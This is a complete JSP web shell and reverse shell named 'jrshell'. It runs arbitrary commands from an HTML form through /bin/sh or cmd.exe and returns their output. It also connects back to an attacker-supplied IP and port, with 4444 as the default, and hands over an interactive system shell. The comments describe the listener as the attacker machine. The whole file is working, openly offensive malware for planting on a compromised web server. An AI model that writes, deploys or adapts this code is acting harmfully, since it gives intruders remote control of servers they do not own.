<%
    /*
     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing 
     * the command specified in the HTML form). This is to avoid to keep it simple.
     */
%>

<%@page import="java.lang.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%@page import="java.util.*"%>

<html>
<head>
    <title>jrshell</title>
</head>
<body>
<form METHOD="POST" NAME="myform" ACTION="">
    <input TYPE="text" NAME="shell">
    <input TYPE="submit" VALUE="Send">
</form>
<pre>
<%

    // Define the OS
    String shellPath = null;
    try
    {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
            shellPath = new String("/bin/sh");
        } else {
            shellPath = new String("cmd.exe");
        }
    } catch( Exception e ){}


    // INNER HTML PART
    if (request.getParameter("shell") != null) {
        out.println("Command: " + request.getParameter("shell") + "\n<BR>");
        Process p;

        if (shellPath.equals("cmd.exe"))
            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
        else
            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));

        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }

    // TCP PORT PART
    class StreamConnector extends Thread
    {
        InputStream wz;
        OutputStream yr;

        StreamConnector( InputStream wz, OutputStream yr ) {
            this.wz = wz;
            this.yr = yr;
        }

        public void run()
        {
            BufferedReader r  = null;
            BufferedWriter w = null;
            try
            {
                r  = new BufferedReader(new InputStreamReader(wz));
                w = new BufferedWriter(new OutputStreamWriter(yr));
                
                char buffer[] = new char[8192];
                int length;
                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
                {
                    w.write( buffer, 0, length );
                    w.flush();
                }
            } catch( Exception e ){}
            try
            {
                if( r != null )
                    r.close();
                if( w != null )
                    w.close();
            } catch( Exception e ){}
        }
    }
 
    // Fixed InteractiveShellHandler that handles character-by-character input
    class InteractiveShellHandler extends Thread
    {
        private Socket socket;
        private Process process;
        private String prompt;

        InteractiveShellHandler(Socket socket, Process process) {
            this.socket = socket;
            this.process = process;
            
            // Create initial prompt
            try {
                String clientIP = InetAddress.getLocalHost().getHostAddress();
                String username = System.getProperty("user.name");
                this.prompt = clientIP + "@" + username + "> ";
            } catch (Exception e) {
                this.prompt = "shell> ";
            }
        }

        public void run() {
            try {
                InputStream processInput = process.getInputStream();
                OutputStream processOutput = process.getOutputStream();
                InputStream socketInput = socket.getInputStream();
                OutputStream socketOutput = socket.getOutputStream();
                
                // Send initial prompt
                socketOutput.write(prompt.getBytes());
                socketOutput.flush();
                
                // Thread to handle process output -> socket (character by character)
                Thread outputThread = new Thread() {
                    public void run() {
                        try {
                            InputStream in = processInput;
                            OutputStream out = socketOutput;
                            byte[] buffer = new byte[1024];
                            int bytesRead;
                            
                            while ((bytesRead = in.read(buffer)) != -1) {
                                if (bytesRead > 0) {
                                    out.write(buffer, 0, bytesRead);
                                    out.flush();
                                }
                            }
                        } catch (Exception e) {
                            // Ignore exceptions when socket closes
                        }
                    }
                };
                outputThread.start();
                
                // Thread to handle socket input -> process (character by character with echo)
                Thread inputThread = new Thread() {
                    public void run() {
                        try {
                            InputStream in = socketInput;
                            OutputStream out = processOutput;
                            
                            byte[] buffer = new byte[1024];
                            int bytesRead;
                            
                            while ((bytesRead = in.read(buffer)) != -1) {
                                if (bytesRead > 0) {
                                    // Send characters to process
                                    out.write(buffer, 0, bytesRead);
                                    out.flush();
                                    
                                    // Echo characters back to socket (except newlines which the shell handles)
                                    for (int i = 0; i < bytesRead; i++) {
                                        byte b = buffer[i];
                                        if (b == 10 || b == 13) { // LF or CR
                                            // Newline - let the shell handle the echo and prompt
                                            continue;
                                        }
                                        // Echo regular characters
                                        socketOutput.write(b);
                                    }
                                    socketOutput.flush();
                                }
                            }
                        } catch (Exception e) {
                            // Ignore exceptions when socket closes
                        }
                    }
                };
                inputThread.start();
                
                // Wait for both threads to complete
                outputThread.join();
                inputThread.join();
                
            } catch (Exception e) {
                // Clean up resources
                try {
                    if (socket != null) socket.close();
                    if (process != null) process.destroy();
                } catch (Exception ex) {}
            }
        }
    }

    // Alternative: Use a simpler approach with proper terminal handling
    class SimpleShellHandler extends Thread
    {
        private Socket socket;
        private Process process;

        SimpleShellHandler(Socket socket, Process process) {
            this.socket = socket;
            this.process = process;
        }

        public void run() {
            try {
                // Simple bidirectional stream forwarding
                new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
                new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
                
                // Wait for the process to exit
                process.waitFor();
                socket.close();
            } catch (Exception e) {
                // Clean up
                try {
                    socket.close();
                    process.destroy();
                } catch (Exception ex) {}
            }
        }
    }

    try {
        // Get IP and port from URL parameters or use defaults
        String ip = request.getParameter("ip");
        String portStr = request.getParameter("port");
        
        // You can set default IP and port here if not provided in URL
        if (ip == null) ip = "127.0.0.1"; // default IP
        if (portStr == null) portStr = "4444"; // default port
        
        if (ip != null && portStr != null) {
            int port = Integer.parseInt(portStr);
            Socket socket = new Socket(ip, port);
            
            // Start the shell with proper terminal settings for Unix
            ProcessBuilder pb = new ProcessBuilder();
            if (shellPath.equals("/bin/sh")) {
                pb.command("/bin/sh", "-i"); // Interactive mode
            } else {
                pb.command("cmd.exe");
            }
            pb.redirectErrorStream(true);
            Process process = pb.start();
            
            // Use the simple handler which works more reliably
            new SimpleShellHandler(socket, process).start();
            
            out.println("Reverse shell connected to " + ip + ":" + port);
        }
     } catch( Exception e ){
         out.println("Connection failed: " + e.getMessage());
     }


%>
</pre>
</body>
</html>